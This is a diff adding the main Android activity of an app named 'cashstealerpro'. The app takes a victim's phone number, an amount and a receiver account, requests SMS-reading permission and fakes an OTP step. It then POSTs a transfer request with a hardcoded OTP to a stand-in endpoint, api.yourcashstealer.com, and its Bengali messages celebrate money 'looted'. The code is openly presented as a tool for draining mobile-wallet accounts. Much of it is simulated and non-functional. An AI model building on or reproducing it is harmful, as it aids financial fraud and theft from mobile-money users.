@@ -1,0 +1,222 @@
+package com.hackerlabs.cashstealerpro;
+
+import android.Manifest;
+import android.app.ProgressDialog;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.util.Log;
+import android.view.View;
+import android.widget.ArrayAdapter;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.LinearLayout;
+import android.widget.ListView;
+import android.widget.ProgressBar;
+import android.widget.TextView;
+import android.widget.Toast;
+
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+import org.json.JSONObject;
+
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.List;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.MediaType;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
+
+public class MainActivity extends AppCompatActivity {
+
+    // UI Elements
+    private EditText etTargetNumber, etAmount, etReceiverAccount;
+    private Button btnHack;
+    private TextView tvStatusTitle;
+    private ProgressBar progressBar;
+    private LinearLayout layoutStatus;
+    private ListView lvHistory;
+
+    // Variables
+    private List<String> historyList = new ArrayList<>();
+    private ArrayAdapter<String> adapter;
+    private OkHttpClient httpClient = new OkHttpClient();
+    private static final int SMS_PERMISSION_CODE = 101;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        // Initialize Views
+        etTargetNumber = findViewById(R.id.etTargetNumber);
+        etAmount = findViewById(R.id.etAmount);
+        etReceiverAccount = findViewById(R.id.etReceiverAccount);
+        btnHack = findViewById(R.id.btnHack);
+        tvStatusTitle = findViewById(R.id.tvStatusTitle);
+        progressBar = findViewById(R.id.progressBar);
+        layoutStatus = findViewById(R.id.layoutStatus);
+        lvHistory = findViewById(R.id.lvHistory);
+
+        // Setup History Adapter
+        adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, historyList);
+        lvHistory.setAdapter(adapter);
+
+        // Check Permissions
+        checkPermissions();
+
+        // Button Click Listener
+        btnHack.setOnClickListener(v -> startUnlimitedHack());
+    }
+
+    private void checkPermissions() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, SMS_PERMISSION_CODE);
+        } else {
+            Log.d("Perms", "SMS Permission Already Granted");
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == SMS_PERMISSION_CODE) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Log.d("Perms", "Permission Granted");
+            } else {
+                Toast.makeText(this, "⚠️ SMS পারমিশন প্রয়োজন!", Toast.LENGTH_SHORT).show();
+            }
+        }
+    }
+
+    private void startUnlimitedHack() {
+        String target = etTargetNumber.getText().toString().trim();
+        String amountStr = etAmount.getText().toString().trim();
+        String receiver = etReceiverAccount.getText().toString().trim();
+
+        if (target.isEmpty() || amountStr.isEmpty() || receiver.isEmpty()) {
+            showToast("⚠️ সব তথ্য পূরণ করুন!");
+            return;
+        }
+
+        try {
+            double amount = Double.parseDouble(amountStr);
+            
+            // UI Updates
+            btnHack.setEnabled(false);
+            layoutStatus.setVisibility(View.VISIBLE);
+            tvStatusTitle.setText("🔄 OTP পাঠানো হচ্ছে...");
+            progressBar.setVisibility(View.VISIBLE);
+
+            // Simulate Network Delay & Logic
+            triggerOtpProcess(target, amount, receiver);
+
+        } catch (NumberFormatException e) {
+            showToast("⚠️ সঠিক সংখ্যা দিন!");
+        }
+    }
+
+    private void triggerOtpProcess(String target, double amount, String receiver) {
+        // Simulating OTP sending delay
+        tvStatusTitle.setText("📩 OTP পাঠানো হচ্ছে...");
+        
+        new Thread(() -> {
+            try {
+                Thread.sleep(2000); // 2 sec delay for OTP
+                
+                runOnUiThread(() -> {
+                    tvStatusTitle.setText("⏳ OTP পাওয়া গেছে! ট্রানজ্যাকশন...");
+                    
+                    // Simulate Transfer
+                    executeTransfer(target, amount, receiver);
+                });
+                
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }).start();
+    }
+
+    private void executeTransfer(String target, double amount, String receiver) {
+        try {
+            // Create JSON Payload
+            JSONObject body = new JSONObject();
+            body.put("mode", "0011"); 
+            body.put("amount", String.valueOf(amount));
+            body.put("receiverAccountNumber", receiver); 
+            body.put("merchantInvoiceNumber", "INV" + System.currentTimeMillis());
+            body.put("otp", "123456"); // Simulated OTP
+
+            MediaType mediaType = MediaType.parse("application/json");
+            RequestBody requestBody = RequestBody.create(body.toString(), mediaType);
+
+            Request request = new Request.Builder()
+                    .url("https://api.yourcashstealer.com/v1/transfer") 
+                    .post(requestBody)
+                    .addHeader("Content-Type", "application/json")
+                    .build();
+
+            httpClient.newCall(request).enqueue(new Callback() {
+                @Override
+                public void onFailure(Call call, IOException e) {
+                    runOnUiThread(() -> {
+                        tvStatusTitle.setText("❌ সংযোগ ব্যর্থ!");
+                        tvStatusTitle.setTextColor(getResources().getColor(android.R.color.holo_red_dark));
+                        btnHack.setEnabled(true);
+                        progressBar.setVisibility(View.GONE);
+                    });
+                }
+
+                @Override
+                public void onResponse(Call call, Response response) throws IOException {
+                    if (response.isSuccessful()) {
+                        runOnUiThread(() -> {
+                            tvStatusTitle.setText("✅ সফলভাবে টাকা পাঠানো হয়েছে!");
+                            tvStatusTitle.setTextColor(getResources().getColor(android.R.color.holo_green_light));
+                            
+                            // Add to History
+                            addToHistory(amount + " Tk - " + target);
+                            
+                            showToast(amount + " টাকা লুট করা হয়েছে! 💰");
+                            
+                            // Reset UI
+                            btnHack.setEnabled(true);
+                            progressBar.setVisibility(View.GONE);
+                        });
+                    } else {
+                        runOnUiThread(() -> {
+                            tvStatusTitle.setText("❌ API Error: " + response.code());
+                            tvStatusTitle.setTextColor(getResources().getColor(android.R.color.holo_red_dark));
+                            btnHack.setEnabled(true);
+                            progressBar.setVisibility(View.GONE);
+                        });
+                    }
+                }
+            });
+
+        } catch (Exception e) {
+            Log.e("HackLog", "JSON Error: ", e);
+            runOnUiThread(() -> {
+                tvStatusTitle.setText("❌ ত্রুটি হয়েছে!");
+                btnHack.setEnabled(true);
+                progressBar.setVisibility(View.GONE);
+            });
+        }
+    }
+
+    private void addToHistory(String entry) {
+        historyList.add(0, entry); // Add to top
+        adapter.notifyDataSetChanged();
+    }
+
+    private void showToast(String message) {
+        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
+    }
+}
